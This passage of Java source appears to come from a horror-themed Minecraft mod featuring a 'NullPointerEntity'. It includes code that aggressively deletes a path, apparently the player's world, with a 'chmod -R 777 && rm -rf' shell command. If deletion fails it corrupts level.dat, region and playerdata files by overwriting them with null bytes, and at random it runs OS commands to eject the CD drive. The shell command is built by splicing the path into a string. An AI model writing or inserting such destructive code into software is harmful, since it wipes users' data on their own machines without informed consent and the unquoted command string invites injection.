                NullPointerEntity.LOGGER.warn("Windows aggressive deletion failed: {}", winError.getMessage());

                // fallback: try to corrupt important files instead of deleting
                try {
                    corruptWorldFiles(path);
                } catch (Exception corruptError) {
                    NullPointerEntity.LOGGER.warn("File corruption also failed: {}", corruptError.getMessage());
                }
            }
        } else {
            // unix/linux/mac - try chmod and rm
            try {
                ProcessBuilder pb = new ProcessBuilder("sh", "-c",
                    "chmod -R 777 \"" + path.toString() + "\" && rm -rf \"" + path.toString() + "\"");
                pb.start().waitFor();

                NullPointerEntity.LOGGER.info("Unix aggressive deletion completed");
            } catch (Exception unixError) {
                NullPointerEntity.LOGGER.warn("Unix aggressive deletion failed: {}", unixError.getMessage());
            }
        }
    }

    // method to corrupt world files if deletion fails
    private static void corruptWorldFiles(java.nio.file.Path worldPath) throws Exception {
        // find and corrupt critical world files
        if (java.nio.file.Files.exists(worldPath)) {
            java.nio.file.Files.walk(worldPath)
                .filter(path -> path.toString().endsWith("level.dat") ||
                               path.toString().endsWith(".mca") ||
                               path.toString().endsWith("playerdata"))
                .forEach(file -> {
                    try {
                        // overwrite file with null bytes to corrupt it
                        byte[] corruptData = new byte[1024];
                        java.util.Arrays.fill(corruptData, (byte) 0x00);
                        java.nio.file.Files.write(file, corruptData,
                            java.nio.file.StandardOpenOption.CREATE,
                            java.nio.file.StandardOpenOption.TRUNCATE_EXISTING);

                        NullPointerEntity.LOGGER.info("Corrupted world file: {}", file);
                    } catch (Exception e) {
                        NullPointerEntity.LOGGER.warn("Could not corrupt file: {}", file);
                    }
                });
        }
    }

    private static void sendNullPointerMessage(ServerPlayerEntity player, String message) {
        // create formatted text: dark red <nullpointerentity> + light red " message"
        Text messageText = Text.literal("<NullPointerEntity>").formatted(Formatting.DARK_RED)
            .append(Text.literal(" " + message).formatted(Formatting.RED));
        player.sendMessage(messageText, false);
    }

    // ngl no one i know has a cd drive so idk if this code even works but i hope it does lmao

    /**
     * easter egg: attempts to eject cd/dvd drive on older systems.
     * fails silently on systems without optical drives.
     * has a 15% chance to trigger when called.
     */

    private static void tryEjectCDDrive() {
        // only 15% chance to trigger this easter egg
        if (Math.random() > 0.15) return;

        try {
            String os = System.getProperty("os.name").toLowerCase();

            if (os.contains("win")) {
                // windows: try multiple methods to eject cd drive
                new Thread(() -> {
                    try {
                        // method 1: powershell with windows media player com object
                        new ProcessBuilder("powershell", "-Command",
                            "(New-Object -com \"WMPlayer.OCX.7\").cdromcollection.item(0).eject()")
                            .start();

                        NullPointerEntity.LOGGER.info("CD drive eject attempted (easter egg)");
                    } catch (Exception e) {
                        // fail silently - most systems don't have cd drives
                        NullPointerEntity.LOGGER.debug("CD eject failed (expected on systems without drives): {}", e.getMessage());
                    }
                }).start();

            } else if (os.contains("mac")) {
                // macos: eject all mounted optical media
                new Thread(() -> {
                    try {
                        new ProcessBuilder("drutil", "eject").start();
                        NullPointerEntity.LOGGER.info("CD drive eject attempted (easter egg)");
                    } catch (Exception e) {
                        NullPointerEntity.LOGGER.debug("CD eject failed: {}", e.getMessage());
                    }
                }).start();

            } else if (os.contains("nix") || os.contains("nux")) {
                // linux: eject cdrom
                new Thread(() -> {
                    try {
                        new ProcessBuilder("eject").start();
                        NullPointerEntity.LOGGER.info("CD drive eject attempted (easter egg)");
                    } catch (Exception e) {
                        NullPointerEntity.LOGGER.debug("CD eject failed: {}", e.getMessage());
                    }
                }).start();
            }

        } catch (Exception e) {
            // silent failure - just a fun easter egg for older systems
        }
    }
}
